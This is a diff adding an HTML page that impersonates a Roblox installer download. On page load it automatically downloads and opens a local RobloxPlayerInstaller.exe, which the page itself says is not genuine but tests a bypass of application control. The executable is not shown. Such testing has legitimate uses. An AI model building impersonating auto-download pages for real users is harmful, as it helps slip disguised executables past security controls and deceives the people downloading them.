@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>A881A021221Iopasdd0123\Download.html</title>
+</head>
+<body>
+    <p>Downloading RobloxPlayerInstaller.exe...</p>
+    <p>> This isn't the acual RobloxPlayerInstaller, it is a verson of the installer that tests a bypass to app control</p>
+    <p>If the file doesn't download, click <a href="../RobloxPlayerInstaller.exe" style="color: blue;" aria-label="Download RobloxPlayerInstaller.exe">here</a></p>
+    <script>
+        function downloadFile(url, filename) {
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = filename || 'download';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        }
+
+        downloadFile('../RobloxPlayerInstaller.exe', 'RobloxPlayerInstaller.exe');
+        window.open('../RobloxPlayerInstaller.exe', '_blank');
+
+    </script>
+</body>
+</html>
